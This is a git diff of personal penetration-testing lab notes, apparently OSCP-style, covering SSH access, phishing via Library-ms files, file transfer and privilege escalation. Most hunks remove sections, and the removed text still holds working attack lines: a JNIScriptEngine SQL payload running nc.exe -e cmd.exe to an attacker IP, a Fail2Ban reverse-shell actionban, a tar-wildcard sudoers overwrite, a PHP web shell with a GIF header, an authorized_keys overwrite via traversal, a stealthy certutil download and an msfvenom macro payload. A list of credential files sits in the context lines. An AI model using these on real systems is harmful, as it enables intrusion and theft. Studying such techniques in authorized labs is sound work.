@@ -6,18 +6,12 @@ Whether you think you can or think you can’t, you’re right."
 ### Technical Procedures and Commands
 
 1. **Accessing Module Exercise VMs via SSH**:
-   ```bash
-   ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@191.168.50.52
-   ```
+```bash
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@191.168.50.52
+```
 
 2. **Addressing File Execution Permission Issues**:
    - If lacking execution permissions, copy the file to a location where execution is permitted.
-
----
-
-### Networking and IP Addressing
-
-- Use the format `193.168.{third octet of TUN0 network interface}.{specific octet associated with the machine}` for specific network addressing.
 
 ---
 
@@ -55,34 +49,11 @@ Whether you think you can or think you can’t, you’re right."
 
 ---
 
-#### Processes
-
-To filter processes to find the processes you'd like:
-```bash
-ps aux | grep process_name
-```
-Aux argument will provide all processes, and ping to grep filters.
-
----
-
 #### Adding Repositories
 
 Sources are stored in /etc/apt/sources.list. Let's say that a package isn't found, so you can't install new binaries or packages, you're likely missing the source location in which the binary or package is held. Modify the provided file to include the source you need.
 
-#### sed
-
-Stream editor.
-
-```bash
-sed s/mysql/MySQL/g /etc/snort/snort.conf > snort2.conf
-```
-Find all of the occurences of 'mysql' (s/mysql), and replace them with 'MySQL globally' (/MySQL/g) in the file '/etc/snort/snort.conf', and sent the output to 'snort2.conf'
-
 ---
-
-#### strings
-
-Pull the strings out of any file.
 
 #### Changing MAC Address
 
@@ -90,22 +61,6 @@ Pull the strings out of any file.
 sudo ifconfig eth0 down
 sudo ifconfig eth0 hw ether 00:00:00:11:11:11
 sudo ifconfig eth0 up
-```
-
-#### Obsidian 
-
-Obsidian stores information in a Vault, which is a folder on our system. We can create both markdown files and folders within the Vault. Obsidian's features include a live preview of markdown text, in-line image placement, code blocks, and a multitude of add-ons such as a community-built CSS extension.
-
-An Obsidian vault can be relocated to another computer and opened from the Welcome menu. Markdown files can simply be dropped into the Vault folders, which will automatically be recognized by Obsidian.
-
-The use of markdown means that we can provide syntax and formatting that is easily copied to most report generation tools, and a PDF can be generated straight from Obsidian itself.
-
-Installing:
-
-```bash
-wget https://github.com/obsidianmd/obsidian-releases/releases/download/v0.14.2/Obsidian-0.14.2.AppImage
-chmod +x Obsidian-0.14.2.AppImage
-./Obsidian-0.`14.2.AppImage
 ```
 
 Some additional cool tools are located in 'https://github.com/nil0x42/awesome-hacker-note-taking'.
@@ -118,7 +73,6 @@ python -m SimpleHTTPServer 80
 #### PenTestMonkey
 
 Great tool of cheat sheets: `https://pentestmonkey.net/cheat-sheet/shells/reverse-cheat-sheet`
-
 
 ### Phishing with Windows Library Files
 
@@ -246,13 +200,6 @@ If for whatever reason (such as doing a SSRF) 127.0.0.1 & localhost (or any othe
 
 When a version for ANYTHING is exposed or uncovered, DO NOT SKIP OVER THIS and search the web for public exploits. This will be a part of your process.
 
-#### Windows' Curl
-
-Stay under the radar and use certutil.exe on Windows to download files from the internet:
-```bash
-certutil.exe -f -urlcache http://123.123.123.123/winPEASx64.exe winpeas.exe
-```
-
 #### Unzipping Files
 
 ```bash
@@ -283,17 +230,7 @@ This service scans our sample against 30 different AV engines and claims to not 
 
 #### Bind Shells
 
-Be aware of this method of access, it is convinient. 
-
-#### Cool *ls* Commands
-
-```bash
-# Extensive command that is all you could as for, consider making an alias
-ls -lsaht
-# Both of these recursively show you the subdirectories and files within
-tree .
-ls -lsaR
-```
+Be aware of this method of access, it is convenient. 
 
 #### Crackstation.net
 
@@ -343,6 +280,9 @@ If you didn't study the payload, you wouldn't see the there are certain characte
 ```bash
 sudo lsof -i :2345
 kill -9 <PID>
+
+netstat -a -b # Not specific port
+Get-Process -Id (Get-NetTCPConnection -LocalPort port).OwningProcess
 ```
 
 #### Is the Computer Connected to Other Internal Computers?
@@ -379,34 +319,24 @@ Try to set up a quick python server and make a get request with HTML:
  #### How to tell if you're dealing with Powershell or CMD
 
  ```bash
- (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
  ```
 
- #### PHPINFO - What to Look For
+#### PHPINFO - What to Look For
 
- Look for the document root, as it will tell you the directory the website is working out of. Also, look at "disable_functions" as it will tell you what functions you're allowed to run in PHP.
+Look for the document root, as it will tell you the directory the website is working out of. Also, look at "disable_functions" as it will tell you what functions you're allowed to run in PHP. There may be information about a user by way of '/home' or 'C:\Users' directory
 
  #### Mark Yourself as the Owner of Current Directory
 
  This is more for ease of use, when you know that the files in this directory could be compromised without you worrying. 
 
- ```bash
- sudo chown -R username:username ./
- ```
-
+```bash
+sudo chown -R username:username ./
+```
 
 #### Probably the best Cheat Sheet I've Found
 
 "https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/" 
-
-
-#### Acessing Loopback Interface
-
-Found webserver running on port 8000 on the remote machine's loopback interface. Do the following to be able to access the port on your own loopback:
-
-```bash
-ssh -N -L 9000:localhost:8000 -i 245/id_ecdsa anita@192.168.196.246 -p 2222
-```
 
 
 #### Swaks
@@ -417,116 +347,6 @@ This didn't work without the '@' in front of the attachment.
 sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.196.189 --body body.txt --header "Subject: Staging Script" -ap
 
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
- ```
-
-#### Transfer Files with NetCat
-
-On your computer:
-
-```bash
-nc -l -p 12345 > received_file
-```
-
-On the remote computer, Windows in this case:
-
-```bash
-Get-Content .\yourfile.txt -Raw | nc.exe <Your_IP_Address> 12345
-```
-
-#### Create Samba (SMB) Share on Kali
-
-To start an SMB share on a Kali Linux machine, you typically use Samba, a popular open-source        
-software suite that provides file and print services to SMB/CIFS clients. Here's a quick guide:      
-
-1. Install Samba:
-
-```bash   
-sudo apt update                            sudo apt install samba
-```
-
-2. Configure Samba:
-
-Edit the Samba configuration file:
-
-```bash
-sudo nano /etc/samba/smb.conf
-```
-
-Add your share definition at the end of the file. For example:        
-
-```bash
-[MyShare]
-path = /path/to/your/share
-available = yes
-valid users = your_username
-read only = no
-browsable = yes              
-public = yes
-writable = yes
-```
-
-3. Add a Samba User:
-
-Samba requires a Linux user to map to. If you haven't already, create a Linux user or use an existing one.
-Then, add the user to Samba:
-
-```bash
-sudo smbpasswd -a your_username
-sudo systemctl restart smbd smbd
-```
-
-4.  Verify the Share:
-
-From a Windows machine, you can access the share using "\\kali_ip\MyShare".
-From a Linux machine, use smbclient to access the share.
-
-```bash
-    "//kali_ip/MyShare -U your_username" 
-```
-Alternative:
-
-Kali:
-
-```bash
-impacket-smbserver -smb2support newShare . -username test -password test
-```
-
-Windows:
-
-```bash
-PS C:\Users\jim\Documents> net use z: \\192.168.45.163\newShare /u:test test
-PS C:\Users\jim\Documents> copy Database.kdbx z:\
-```
-
-You can also execute commands that lie on your Linux machine from a Windows one through SMB shares:
-
-```bash
-sudo smbserver.py -smb2support Share .
-
-CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.45.163/Share/nc.exe -e cmd.exe 192.168.45.163 8082").getInputStream()).useDelimiter("\\Z").next()');
-#or 
-CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.45.163/Share/wicked.exe").getInputStream()).useDelimiter("\\Z").next()');
-```
-
-#### Host Simple FTP Server
-
-```bash
-python -m pyftpdlib -w
-```
-
-#### Host an Apache Web Server
-
-```bash
-sudo systemctl start apache2
-cp file.txt /var/www/html/
-# You can access the files on port 80 of your machine/ip
-```
-
-#### Borg
-
-```bash
-sudo borg list /opt/borgbackup/
-sudo borg extract /opt/borgbackup/::home --stdout
 ```
 
 #### Verify Checksum
@@ -556,75 +376,6 @@ Let's say that you're executing a reverse shell (from a reverse shell), and you 
 Start-Process -NoNewWindow .\binary80.exe
 ```
 
-#### Check What Process is Running on a Port
-
-```bash
-Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | Get-Process
-```
-
-```bash
-sudo ss -ltnp | grep ':8080'
-# or
-sudo netstat -ltnp | grep ':8080'
-```
-
-#### Overwrite or Modify authorized_keys
-
-```bash
-ssh-keygen
-cat key.pub > ../../../../../../../../../../root/.ssh/authorized_keys
-ssh -i key root@<ip address>
-```
-
-```bash
-#### Upload SSH Key Properly
-
-```bash
-ssh-keygen -t rsa
-chmod 600 file
-chmod 666 file.pub
-mv file.pub authorized_keys
-# Copy the contents of (authorized_keys) file.pub to their authorized_keys file
-ssh -i file user@host
-```
-
-#### Exposed Git Repo from URL
-
-```bash
-wget -r -np -nH --cut-dirs=1 -R "index.html*" http://192.168.211.144/.git/
-# or
-python3 /opt/git-dumper/git_dumper.py http://192.168.211.144/.git .
-```
-
-Then, do:
-
-```bash
-git log
-git show <each commit>
-```
-
-Check .htaccess, see if there are any special Headers that you need to supply, check whether there is anything mentioning virtual hosts.
-
-To modify vhost you would switch "Host: 10.10.11.177" to "Host: dev.siteisup.htb".
-
-#### Bypassing File Upload Extension with Phar
-
-Phar is basicaly a zip that allows you to navigate to files within and execute with PHP. You can simply rename the phar to another extension name, such as jpeg.
-
-Note that is your php reverse shell isn't working, but you can echo strings, check phpinfo() for disable_functions and see what you're able to run. An example of proc_open is in scripts directory.
-
-
-```bash
-zip test.phar reverse.php
-mv test.phar test.jpeg
-
-GET /?page=phar://uploads/test.jpeg/reverse
-```
-
-#### Automatically Adding Custom Header in BurpSuite
-
-Go to Proxy > Options > Scroll Down to Match and Replace > Add the header in Replace section
-
 #### Cracking Zip File
 
 ```bash
@@ -633,40 +384,10 @@ john -w=/usr/share/wordlists/rockyou.txt zip.hash
 7z x protected.zip
 ```
 
-#### Evil-WinRM Functionality
-
-You can easily download files from the windows machine to your kali vm using:
-
-```bash
-download <remote file path> <local file path>
-```
-
 #### Name Mash
 
 If you have first and last names, you can use this program to create different popular formats for usernames, "https://gist.github.com/superkojiman/11076951".
 
-
-#### Uploading "GIF"
-
-If you have the "GIF89a;" at the beginning, you may be able to bypass blacklists.
-
-```bash
-GIF89a;
-<?php system($_GET["cmd"]); ?
-```
-
-#### Getting a Reverse Shell from SMB (Windows)
-
-You can create a .lnk file with hashgrab.py and impacket's smb server:
-
-```bash
-python3 /opt/hashgrab.py 192.168.45.163 test
-sudo responder -I tun0
-# or impacket-smbserver share share -smb2support
-smbclient \\\\$ip\\nara
-put test.lnk
-# look for hashes in smb server
-```
 
 #### Getting a Reverse Shell with VBA Macros
 
@@ -681,24 +402,6 @@ LHOST=$yourIP
 LPORT=$yourPort
 Payload encoder: None
 Select or enter file name (without extensions): hacker
-
-# With MSFVenom
-msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.doc
-```
-
-#### Add a Comproised User to Remote Access through LDAP
-
-```bash
-ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
-
-evil-winrm -u tracy.white -i nara.nara-security.com
-```
-
-#### Split Strings in Bash
-
-```bash
-# Splits on each ':' and grabs the 3rd index (for each line)
-awk -F: '{ print $4 }' ntds.hashes
 ```
 
 #### Auth through nc bind
@@ -722,19 +425,6 @@ you can authenticate by typing:
 auth <default password>
 ```
 
-
-#### Modifying Parameters for Login Portals , BurpSuite
-
-Take the time to review any account login information in BurpSuite. Look at the response.. in the scenario that you're creating a new account and there's an email verification, is there a parameter "confirmed" that decides if it recognizes you? Hijack the email parameter:
-
-```bash
-// Before
-_method=patch&authenticity_token=sqroxonHHHMVjShpvoFQxdQaO5lP9Z-w_XCLkSzgHY9UDTziioXABz5UKg8E0pO7qUVlzkDlK6WfwSjluHnkMQ&user%5Bemail%5D=test2%40test.test&commit=Change%20email
-
-//After
-_method=patch&authenticity_token=RSv5NyN2tJJgQcgbwtyWzA7oHYcTW4dSZNsLoHuASc-jjC0TIDRo5kuYyn14j1Wyc7dD0BxLM0cGaqjU7xmwcQ&user%5Bconfirmed%5D=True&commit=Change%20email
-```
-
 #### Interesting Files for File Inclusion, Path Traversal
 
 ```bash
@@ -745,22 +435,13 @@ _method=patch&authenticity_token=RSv5NyN2tJJgQcgbwtyWzA7oHYcTW4dSZNsLoHuASc-jjC0
 /root/.ssh/id_ed25519
 /home/user/.ssh/id_rsa
 /home/user/.ssh/id_ecdsa
-/hom/user/.ssh/id_ed25519
+/home/user/.ssh/id_ed25519
 /proc/self/environ
 /proc/self/cmdline
 /var/www/html/index.php # Or any interesting files you didn't have access to with gobuster
 /home/user/.bash_history
 /root/.bash_history
 /etc/ssh/sshd_config # See who's allowed to ssh into the box
-```
-
-#### Fail2Ban
-
-If you're a part of the fail2ban group, check out the main configuration file which can be found at /etc/fail2ban/jail.conf. Look for how to get banned, as well as what the ban action is. If you can modify the ban file or action directly, you can make it give you a reverse shell onto the box as root.
-
-```bash
-#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
-actionban = /usr/bin/nc 192.168.45.163 873 -e /bin/sh
 ```
 
 #### Stop a Backgrounded Process
@@ -778,22 +459,6 @@ fg %1 # then Ctrl+C
 #### ODT Files to Capture NTLM Hash
 
 If you can upload ODT files to a Windows backend, consider making an ODT file that reaches out to your server that is listening for hashes. You can do this easily with 44564 on ExploitDB.
-
-#### Wildcard Cronjobs
-
-If you see a cronjob with a wildcard, you may need to get creative for privescs. Use GTFOBins for inspiration, and just Google around if you're stuck. In this case, the cronjob was
-
-```bash
-cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
-```
-
-In order to append an abuse command to the end of the cronjob, this is what I did:
-
-```bash
-echo 'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
-echo "" > "--checkpoint-action=exec=sh privesc.sh"
-echo "" > --checkpoint=1
-```
 
 #### Remove Duplicated Words
 
@@ -820,47 +485,3 @@ That doesn't remove punctuation, though, so maybe you want:
 ```bash
 tr -s [:space:][:punct:] \\n < filename | sort | uniq
 ```
-
-#### SNMPWalk
-
-Always run this is snmp is open:
-
-```bash
-snmpwalk -v 2 -c public $ip NET-SNMP-EXTEND-MIB::nsExtendObjects
-```
-
-#### Get Users in DC (Authenticated)
-
-Gather information about users if you have creds but can't get on a box:
-
-```bash
-impacket-GetADUsers -dc-ip 192.168.214.122 "exampleH.example/" -all
-impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all
-```
-
-#### Run BloodHound Remotely
-
-If you have creds for LDAP/RPC/SMB but you can't get a shell, run BloodHound remotely to see what you can find.
-
-```bash
-/opt/BloodHound.py/bloodhound.py -d exampleH.example -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
-```
-
-#### GraphQL
-
-Navigate to "http://site.com/graphql/". Then, you want to extract information.
-
-```bash
-{__schema {
-   types {
-      name
-      kind
-      description
-      fields {
-         name
-      }
-   }
-}}
-```
-
-Url encode that, then query it within the url, "http://site.com/graphql?query=%7B__schema%20%7B%0A%20%20%20types%20%7B%0A%20%20%20%20%20%20name%0A%20%20%20%20%20%20kind%0A%20%20%20%20%20%20description%0A%20%20%20%20%20%20fields%20%7B%0A%20%20%20%20%20%20%20%20%20name%0A%20%20%20%20%20%20%7D%0A%20%20%20%7D%0A%7D%7D". Say there's a user object with a password and you want to query what it is, you can do that by putting "{ user { username, password } }"
